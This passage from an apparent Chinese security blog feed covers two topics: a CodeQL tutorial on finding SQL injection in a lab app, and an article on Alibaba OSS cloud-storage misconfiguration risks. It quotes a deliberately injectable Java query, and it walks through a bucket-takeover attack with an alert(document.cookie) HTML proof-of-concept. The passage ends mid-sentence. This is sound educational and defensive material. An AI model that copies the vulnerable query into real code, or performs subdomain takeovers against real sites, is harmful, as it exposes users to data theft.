&#125;</span><br></pre></td></tr></table></figure><p>方法设置Sink。</p><p>在本案例中，我们的sink应该为<code>executeQuery</code>方法(Method)的调用(MethodAccess)，所以我们设置Sink为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">exists(Method method, MethodAccess call |</span><br><span class="line">  method.hasName(&quot;executeQuery&quot;)</span><br><span class="line">  and</span><br><span class="line">  call.getMethod() &#x3D; method and</span><br><span class="line">  sink.asExpr() &#x3D; call.getArgument(0)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个query()方法的调用点，并把它的第一个参数设置为sink。</p><p>在靶场系统中，sink就是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><p>因为我们测试的注入漏洞，当source变量流入这个方法的时候，才会发生注入漏洞！</p><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>设置好Source和Sink，就相当于搞定了首尾，但是首尾是否能够连通才能决定是否存在漏洞！</p><p>一个受污染的变量，能够毫无阻拦的流转到危险函数，就表示存在漏洞！</p><p>这个连通工作就是CodeQL引擎本身来完成的。我们通过使用<code>config.hasFlowPath(source, sink)</code>方法来判断是否连通。</p><p>比如如下代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>我们传递给<code>config.hasFlowPath(source, sink)</code>我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。</p><p>在CodeQL中，我们使用官方提供的TaintTracking::Configuration方法定义source和sink，至于中间是否是通的，这个后面使用CodeQL提供的<code>config.hasFlowPath(source, sink)</code>来帮我们处理。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this &#x3D; &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;executeQuery&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() &#x3D; method and</span><br><span class="line">      sink.asExpr() &#x3D; call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>CodeQL语法和Java类似，extends代表集成父类TaintTracking::Configuration。</p><p>这个类是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink)</p><p>src instanceof RemoteFlowSource 表示src 必须是 RemoteFlowSource类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。</p></blockquote><p>最终代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> *&#x2F;</span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    VulConfig() &#123; this &#x3D; &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;executeQuery&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() &#x3D; method and</span><br><span class="line">      sink.asExpr() &#x3D; call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config,DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink,&quot;source&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230602111944898.png" alt="image-20230602111944898"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230602160826971.png" alt="image-20230602160826971"></p><p>使用靶场系统(micro-service-seclab)进行测试</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230602160954970.png" alt="image-20230602160954970"></p><h3 id="误报处理"><a href="#误报处理" class="headerlink" title="误报处理"></a>误报处理</h3><p>我们发现存在一处误报的现象</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230602161126265.png" alt="image-20230602161126265"></p><p>这个方法的参数类型是List<Long>，不可能存在注入漏洞。</Long></p><p>这说明我们的规则里，对于List<Long>，甚至List<Integer>类型都会产生误报，source误把这种类型的参数涵盖了。</Integer></Long></p><p>我们需要采取手段消除这种误报。</p><p>这个手段就是<code>isSanitizer</code>。</p><blockquote><p>isSanitizer是CodeQL的类<code>TaintTracking::Configuration</code>提供的净化方法。它的函数原型是：</p><p>override predicate isSanitizer(DataFlow::Node node) {}</p><p>在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断。</p><p>override predicate isSanitizer(DataFlow::Node node) {<br>node.getType() instanceof PrimitiveType or<br>node.getType() instanceof BoxedType or<br>node.getType() instanceof NumberType<br>}</p><p>表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在。</p></blockquote><p>由于CodeQL检测SQL注入里的<code>isSanitizer</code>方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报问题。</p><p>那我们只需要将这种复合类型加入到isSanitizer方法，即可消除这种误报。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() &#x3D; pt and pt.getTypeArgument(0) instanceof NumberType )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。<br>重新执行query，我们发现，刚才那条误报已经被成功消除啦。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230602161936774.png" alt="image-20230602161936774"></p><h4 id="漏报解决"><a href="#漏报解决" class="headerlink" title="漏报解决"></a>漏报解决</h4><p>我们发现，如下的SQL注入并没有被CodeQL捕捉到。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public List&lt;Student&gt; getStudentWithOptional(Optional&lt;String&gt; username) &#123;</span><br><span class="line">        String sqlWithOptional &#x3D; &quot;select * from students where username like &#39;%&quot; + username.get() + &quot;%&#39;&quot;;</span><br><span class="line">        &#x2F;&#x2F;String sql &#x3D; &quot;select * from students where username like ?&quot;;</span><br><span class="line">        return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏报理论上讲是不能接受的。如果出现误报我们还可以通过人工筛选来解决，但是漏报会导致很多漏洞流经下一个环节到线上，从而产生损失。</p><p>那我们如果通过CodeQL来解决漏报问题呢？答案就是通过<code>isAdditionalTaintStep</code>方法。</p><p>实现原理就一句话：</p><p><strong>断了就强制给它接上。</strong></p><blockquote><p>isAdditionalTaintStep方法是CodeQL的类<code>TaintTracking::Configuration</code>提供的的方法，它的原型是：</p><p>override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {}</p><p>它的作用是将一个可控节点<br>A强制传递给另外一个节点B，那么节点B也就成了可控节点。</p></blockquote><p>多次测试之后，我认定是因为username.get()这一步断掉了。大概是因为Optional这种类型的使用没有在CodeQL的语法库里。</p><p>那么这里我们强制让username流转到username.get()，这样username.get()就变得可控了。这样应该就能识别出这个注入漏洞了。</p><p>我们试一下。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230705154902247.png" alt="image-20230705154902247"></p><p>发现成功捕捉到了相关漏洞</p><h2 id="利用codeql规则集进行扫描"><a href="#利用codeql规则集进行扫描" class="headerlink" title="利用codeql规则集进行扫描"></a>利用codeql规则集进行扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">codeql database analyze --threads 16 java-sec-code-db codeql-main&#x2F;java&#x2F;ql&#x2F;src&#x2F;codeql-suites&#x2F;java-security-and-quality.qls --format&#x3D;sarifv2.1.0 --output&#x3D;result.sarifv</span><br></pre></td></tr></table></figure><p>保存成sarifv格式，同时也可以保存csv格式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Shutting down query evaluator.</span><br><span class="line">Interpreting results.</span><br><span class="line">Analysis produced the following diagnostic data:</span><br><span class="line"></span><br><span class="line">|          Diagnostic          |       Summary        |</span><br><span class="line">+------------------------------+----------------------+</span><br><span class="line">| Extraction warnings          | 1 result (1 warning) |</span><br><span class="line">| Successfully extracted files | 61 results           |</span><br><span class="line"></span><br><span class="line">Analysis produced the following metric data:</span><br><span class="line"></span><br><span class="line">|                  Metric                  | Value |</span><br><span class="line">+------------------------------------------+-------+</span><br><span class="line">| Total lines of Java code in the database |  3273 |</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230710105828809.png" alt="image-20230710105828809" style="zoom:50%;"><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230710105953177.png" alt="image-20230710105953177"></p><h3 id="如何编写codeql规则集"><a href="#如何编写codeql规则集" class="headerlink" title="如何编写codeql规则集"></a>如何编写codeql规则集</h3><p><a href="https://tonghuaroot.com/2021/09/18/Write-test-files-for-CodeQL-custom-rules/">https://tonghuaroot.com/2021/09/18/Write-test-files-for-CodeQL-custom-rules/</a></p><h3 id="自动化codeql探索"><a href="#自动化codeql探索" class="headerlink" title="自动化codeql探索"></a>自动化codeql探索</h3><p><a href="https://github.com/ZhuriLab/Yi">https://github.com/ZhuriLab/Yi</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230710144020573.png" alt="image-20230710144020573"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230710144111187.png" alt="image-20230710144111187"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><p><a href="https://www.freebuf.com/articles/web/283795.html">https://www.freebuf.com/articles/web/283795.html</a></p></li><li><p><a href="http://www.lvyyevd.cn/archives/codeqlmd">http://www.lvyyevd.cn/archives/codeqlmd</a></p></li><li><p><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html</a></p></li><li><p><a href="https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/#more">https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/#more</a></p></li><li><p><a href="https://tonghuaroot.com/2021/09/18/Write-test-files-for-CodeQL-custom-rules/">https://tonghuaroot.com/2021/09/18/Write-test-files-for-CodeQL-custom-rules/</a></p></li><li><p><a href="https://github.com/ZhuriLab/Yi">https://github.com/ZhuriLab/Yi</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;如何安装&quot;&gt;&lt;a href=&quot;#如何安装&quot; class=&quot;headerlink&quot; title=&quot;如何安装&quot;&gt;&lt;/a&gt;如何安装&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/466504018&quot;&gt;安装codeql&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;基本查询&quot;&gt;&lt;a href=&quot;#基本查询&quot; class=&quot;headerlink&quot; title=&quot;基本查询&quot;&gt;&lt;/a&gt;基本查询&lt;/h2&gt;&lt;h3 id=&quot;查询结构&quot;&gt;&lt;a href=&quot;#查询结构&quot; class=&quot;headerlink&quot; title=&quot;查询结构&quot;&gt;&lt;/a&gt;查询结构&lt;/h3&gt;&lt;p&gt;查询基本包含3部分，作用与SQL查询的FROM、WHERE、SELECT部分类似。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;left&quot;&gt;查询部分&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;目的&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;细节&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;import java&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;为 Java 和 Kotlin 导入标准 CodeQL 库。&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;每个查询都以一个或多个语句开始&lt;code&gt;import&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;from MethodAccess ma&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;定义查询的变量。声明的形式为： &lt;code&gt;&amp;lt;type&amp;gt; &amp;lt;variable name&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;我们用：&lt;code&gt;MethodAccess&lt;/code&gt;调用表达式的变量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;where ma.getMethod().hasName(&amp;quot;equals&amp;quot;) and ma.getArgument(0).(StringLiteral).getValue() = &amp;quot;&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;定义变量的条件。&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;ma.getMethod().hasName(&amp;quot;equals&amp;quot;)&lt;/code&gt;仅限&lt;code&gt;ma&lt;/code&gt;于调用方法 call &lt;code&gt;equals&lt;/code&gt;。&lt;code&gt;ma.getArgument(0).(StringLiteral).getValue() = &amp;quot;&amp;quot;&lt;/code&gt;说参数必须是文字的&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;select ma, &amp;quot;This comparison to empty string is inefficient, use isEmpty() instead.&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;定义每次匹配报告的内容。&lt;code&gt;select&lt;/code&gt;用于查找不良编码实践实例的查询语句始终采用以下形式： &lt;code&gt;select &amp;lt;program element&amp;gt;, &amp;quot;&amp;lt;alert message&amp;gt;&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;.equals&lt;/code&gt;使用解释问题的字符串报告生成的表达式。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Code_audit" scheme="http://www.ol4three.com/tags/Code-audit/"/>
    
      <category term="WEB安全" scheme="http://www.ol4three.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
      <category term="codeql" scheme="http://www.ol4three.com/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>OSS云存储相关安全风险</title>
    <link href="http://www.ol4three.com/2022/07/27/WEB/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"/>
    <id>http://www.ol4three.com/2022/07/27/WEB/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/</id>
    <published>2022-07-27T10:25:17.000Z</published>
    <updated>2023-03-30T03:16:05.624Z</updated>
    
    <content type="html"><![CDATA[<p>​    OSS服务作为一项重要的云上服务，承担了存储用户数据的重要功能。对象存储服务提供了细粒度的访问权限控制功能，以保证用户数据的安全性。<strong>如果使用OSS服务时安全意识不足或对访问权限以及访问策略错误理解，将会导致数据被非法访问或篡改，产生严重后果。</strong></p><p>本文将介绍下相关OSS云存储相关方面的风险问题，老规矩先上一张图。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330091632227.png" alt="image-20230330091632227" style="zoom:50%;"> <a id="more"></a><h2 id="0x00-础介绍"><a href="#0x00-础介绍" class="headerlink" title="0x00 础介绍"></a>0x00 础介绍</h2><blockquote><p>​    对象存储OSS是一种云存储服务，可以存储大量非结构化数据，例如图像、视频和文本等。由于 OSS 是一种公共云服务，因此存在安全方面的问题。其中，最大的问题之一是数据隐私和安全。企业应该制定一些安全措施来保护数据的机密性和完整性。例如，使用加密技术对数据进行加密，并使用访问控制策略来限制用户对数据的访问。</p></blockquote><p>​    对象存储作为云原生的一项重要功能，面临着一系列安全挑战。但在对象存储所导致的安全问题中，绝大部分是由于用户使用此功能时错误的配置导致的。据统计，由于缺乏经验或人为错误导致的存储桶错误配置所造成的安全问题占所有云安全漏洞的16%。例如<strong>2017年美国新闻与金融信息公司道琼斯（Dow Jones &amp; Company）发生用户数据泄露事件</strong>，安全研究人员在亚马逊云服务器上发现440万道琼斯客户的细节信息，被泄露信息包含<strong>客户姓名、ID、住址、订阅细节、信用卡后四位和部分电话号码</strong>。 道琼斯公司已确认此事，称有220万客户数据受影响，数据泄露的主要原因是道琼斯公司对服务器的权限配置错误。</p><p>下面将介绍下对象存储OSS产品中涉及的几个基本概念，方便后续对其涉及到的安全风险更好的了解。</p><h3 id="存储空间（Bucket）"><a href="#存储空间（Bucket）" class="headerlink" title="存储空间（Bucket）"></a>存储空间（Bucket）</h3><p>存储空间是用户用于存储对象（Object）的容器，所有的对象都必须隶属于某个存储空间。存储空间具有各种配置属性，包括地域、访问权限、存储类型等。用户可以根据实际需求，创建不同类型的存储空间来存储不同的数据。</p><h3 id="对象（Object）"><a href="#对象（Object）" class="headerlink" title="对象（Object）"></a>对象（Object）</h3><p>对象是OSS存储数据的基本单元，也被称为OSS的文件。和传统的文件系统不同，对象没有文件目录层级结构的关系。对象由元信息（Object Meta），用户数据（Data）和文件名（Key）组成，并且由存储空间内部唯一的Key来标识。对象元信息是一组键值对，表示了对象的一些属性，比如最后修改时间、大小等信息，同时用户也可以在元信息中存储一些自定义的信息。对象的生命周期是从上传成功到被删除为止。在整个生命周期内，除通过追加方式上传的Object可以通过继续追加上传写入数据外，其他方式上传的Object内容无法编辑。</p><h3 id="OjbectKey"><a href="#OjbectKey" class="headerlink" title="OjbectKey"></a>OjbectKey</h3><p>在各语言SDK中，ObjectKey、Key以及ObjectName是同一概念，均表示对Object执行相关操作时需要填写的Object名称。例如向某一存储空间上传Object时，ObjectKey表示上传的Object所在存储空间的完整名称，即包含文件后缀在内的完整路径，如填写为abc/efg/123.jpg。</p><h3 id="Region（地域）"><a href="#Region（地域）" class="headerlink" title="Region（地域）"></a>Region（地域）</h3><p>Region表示OSS的数据中心所在物理位置。用户可以根据费用、请求来源等选择合适的地域创建Bucket。一般来说，距离用户更近的Region访问速度更快。Region是在创建Bucket的时候指定的，一旦指定之后就不允许更改。该Bucket下所有的Object都存储在对应的数据中心，目前不支持Object级别的Region设置。</p><h3 id="Endpoint（访问域名）"><a href="#Endpoint（访问域名）" class="headerlink" title="Endpoint（访问域名）"></a>Endpoint（访问域名）</h3><p>Endpoint表示OSS对外服务的访问域名。OSS以HTTP RESTful API的形式对外提供服务，当访问不同的Region的时候，需要不同的域名。通过内网和外网访问同一个Region所需要的Endpoint也是不同的。</p><h3 id="6-AccessKey（访问密钥）"><a href="#6-AccessKey（访问密钥）" class="headerlink" title="6.AccessKey（访问密钥）"></a>6.AccessKey（访问密钥）</h3><p>AccessKey简称AK，指的是访问身份验证中用到的<strong>AccessKey</strong> ID和<strong>AccessKey Secret</strong>。OSS通过使用AccessKey ID和AccessKey Secret对称加密的方法来验证某个请求的发送者身份。AccessKey ID用于标识用户；AccessKey Secret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，必须保密。</p><p>AccessKey包含以下三种：</p><ul><li>Bucket的拥有者申请的AccessKey。</li><li>被Bucket的拥有者通过RAM授权给第三方请求者的AccessKey。</li><li>被Bucket的拥有者通过STS授权给第三方请求者的AccessKey。</li></ul><h3 id="AK-SK访问控制"><a href="#AK-SK访问控制" class="headerlink" title="AK/SK访问控制"></a>AK/SK访问控制</h3><p>原始AK/SK是指您在注册OSS服务时，系统自动分配的AK（Access Key ID） / SK（Secret Access Key）。主要用于对用户的调用行为进行鉴权和认证，相当于API专用的用户名及密码。您向OSS发送的每个请求，都需要通过鉴权认证通过后，OSS才会处理您的请求。</p><p>移动端场景使用原始AK/SK鉴权的交互过程如下图所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330092537813.png" alt="image-20230330092537813"></p><p>使用原始的AK/SK下发到移动端势必会存在一定的安全风险，因此，原始AK/SK鉴权方式只推荐您在测试过程中使用，提供正式服务时推荐使用STS方式鉴权。</p><p><strong>STS临时授权访问</strong></p><p>BOS可以通过STS机制实现第三方的临时授权访问。STS（Security Token Service）是由OSS服务商提供的临时授权服务。通过STS，您可以为第三方用户颁发一个自定义时效和权限的访问凭证。第三方用户可以使用该访问凭证直接调用API访问OSS资源。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330092606510.png" alt="image-20230330092606510"></p><p><strong>使用STS的优点：</strong></p><ul><li>不需要向第三方用户透露您的管理账号或AK/SK信息，只需要向STS申请一个<strong>临时访问凭证</strong>并颁发给第三方用户即可，且这个访问凭证拥有的权限和有效期均可由自己去定义。</li><li>您不需要关注该权限的撤销问题，<strong>临时访问凭证在过期后会自动失效</strong>。</li><li>STS临时访问的权限也需要进行严格把控，利用STS申请的AK/SK、临时凭证Token也会存在一定的<strong>安全风险</strong>。</li></ul><h2 id="0x01-常见风险点"><a href="#0x01-常见风险点" class="headerlink" title="0x01 常见风险点"></a>0x01 常见风险点</h2><p>常见的OSS安全风险点有如下几种，下面将会分别进行介绍。</p><h3 id="存储空间访问权限"><a href="#存储空间访问权限" class="headerlink" title="存储空间访问权限"></a>存储空间访问权限</h3><p>存储空间（Bucket）是存储对象（Object）的容器。对象都隶属于存储空间，存储空间的访问权限（ACL）有以下三类：</p><table><thead><tr><th>访问权限</th><th>描述</th><th>访问权限值</th></tr></thead><tbody><tr><td>私有</td><td>存储空间的拥有者和授权用户有文件的读写权限，其他用户没有权限操作文件。</td><td>oss.ACLPrivate</td></tr><tr><td>公共读</td><td>存储空间的拥有者和授权用户有文件的读写权限，其他用户只有读权限。请谨慎使用该权限。</td><td>oss.ACLPublicRead</td></tr><tr><td>公共读写</td><td>所有用户都有文件的读写权限。请谨慎使用该权限。</td><td>oss.ACLPublicReadWrite</td></tr></tbody></table><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330092659927.png" alt="image-20230330092659927" style="zoom:50%;"><p>在上传文件（Object）时未指定文件的ACL，则文件的ACL均默认继承Bucket ACL。 故申请OSS Bucket一般<strong>禁止申请公共读写</strong>。<strong>公共读写意味着互联网上任何用户都可以对该Object进行访问，并且向该Object写入数据</strong>。这有可能造成数据的外泄以及费用激增，若被人恶意写入违法信息还可能会影响公司商誉。</p><p>如果想加速文件访问，可以配置OSS 私有Bucket回源。但需要注意，开启OSS私有Bucket回源授权后，即授权CDN对您所有Bucket的只读权限，不只是对当前Bucket授权。</p><h3 id="AccessKey泄漏"><a href="#AccessKey泄漏" class="headerlink" title="AccessKey泄漏"></a>AccessKey泄漏</h3><p>AccessKey是用户访问内部资源最重要的身份凭证。用户调用API时的通信加密和身份认证会使用API凭证（即基于非对称密钥算法的鉴权密钥对）。API凭证是云上用户调用云服务API、访问云上资源的唯一身份凭证。API凭证相当于登录密码。用户可以使用<strong>AccessKey（简称AK）构造一个API请求（或者使用云服务**</strong>SDK<strong>**）来操作资源。AccessKey包括AccessKey ID和AccessKey Secret。其中AccessKey ID用于标识用户，AccessKey Secret是用来验证用户身份合法性的密钥。AccessKey Secret必须保密。</strong></p><p>但在实际开发过程中，部分开发人员意识不强。前端开发者有些会直接使用<strong>SDK**</strong>上传，硬编码AccessKey进行上传，这种方式极其危险<strong>，前端禁止使用该操作上传文件。可以让后端上传，或者通过STS服务颁发一个临时访问凭证。该临时访问凭证可在规定时间内访问OSS资源。临时访问凭证无需透露长期密钥，使OSS资源访问相对安全。但是同时</strong>STS认证权限存在问题仍然会导致严重后果**：</p><ol><li><strong>利用 AK/SK泄漏调用IAM权限进行用户级操作</strong></li><li><strong>利用 AK/SK泄漏调用Bucket相关权限操作</strong></li></ol><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330093633261.png" alt="image-20230330093633261"></p><h3 id="文件覆盖风险"><a href="#文件覆盖风险" class="headerlink" title="文件覆盖风险"></a>文件覆盖风险</h3><p>如果在<strong>配置存储桶</strong>时，管理员错误的<strong>将存储桶权限，配置为可写</strong>，这将会导致攻击者可上传任意文件到存储桶中，或覆盖已经存在的文件。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330093924697.png" alt="image-20230330093924697"></p><p>如果错误配置权限，可以通过<strong>去除掉PutObject权限</strong>方式解决。但如果必须使用到该权限，该如何做呢？</p><blockquote><p>在Web、App等应用开发中，经常会发生此类问题。例如场景：在一个Web应用使用对象存储来存储用户上传视频，且通过客户端直传的方式将用户上传的视频上传至Bucket中，并希望在存储桶/app/路径中存储桶用户的头像，由于后端开发时为了方便而进行了不规范的存储桶Policy配置，在生成用户用以上传视频的临时密钥时直接将此临时密钥允许访问的 resource 指定为 acs:oss:<em>:</em>:app/image/<em>路径。 这样以来，系统为每个用户所生成的用以上传的临时密钥虽然不相同，但是这个临时密钥都拥有acs:oss:</em>:<em>:app/image/</em>路径中的所有资源的读写权限，<strong>这将会带来严重的安全问题</strong>。</p></blockquote><p>此时<strong>可通过控制Policy</strong>，限制生成的临时认证权限。通过每个用户的用户标识来为每一个用户设置一个独用的路径，例如可以在为用户生成临时密钥时，<strong>将policy中resource 指定为 acs:oss:***</strong>:<strong>***:app/image/${user_id}/</strong></p><h3 id="Bucket接管风险"><a href="#Bucket接管风险" class="headerlink" title="Bucket接管风险"></a>Bucket接管风险</h3><p>当我们正常进行测试并访问static-good-boy.huoxian.cn。</p><p>1、static-good-boy.huoxian.cn指向了static-good-boy.oss-cn-beijing.aliyuncs.com这个子域名</p><p>2、static-good-boy.oss-cn-beijing.aliyuncs.com这个桶不存在</p><p>也就是说我只要申请 static-good-boy这个桶，那么我就可以控制static-good-boy.oss-cn-beijing.aliyuncs.com的内容，而static-good-boy.huoxian.cn指向了static-good-boy.oss-cn-beijing.aliyuncs.com，就相当于变相的控制了static-good-boy.huoxian.cn，而在static-good-boy.huoxian.cn上窃取其他huoxian.cn子域名的一些cookie等信息是有很大可能的~</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095020126.png" alt="image-20230330095020126" style="zoom:50%;"><p>创建同名Bucket</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095041385.png" alt="image-20230330095041385" style="zoom:50%;"><p>创建完成后，上传文件进行测试</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta&gt;</span><br><span class="line">take over by mkdd~&lt;br&gt;</span><br><span class="line">&lt;input value=&quot;click&quot; onclick=&quot;alert(document.cookie)&quot;&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>成功上传后访问链接，成功<strong>接管</strong>OSS服务</p><p>static-good-boy.huoxian.cn/mkdd.html</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095137450.png" alt="image-20230330095137450" style="zoom:50%;"><h3 id="XSS风险"><a href="#XSS风险" class="headerlink" title="XSS风险"></a>XSS风险</h3><p>如果目标的对象存储支持 html 